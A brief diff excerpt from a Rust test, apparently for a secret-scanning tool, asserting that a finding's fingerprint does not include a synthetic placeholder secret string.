+            !finding
+                .fingerprint
+                .contains("SYNTHETIC_MCP_SECRET_FOR_FINGERPRINT_TEST")
+        }));
     }
 
     #[test]
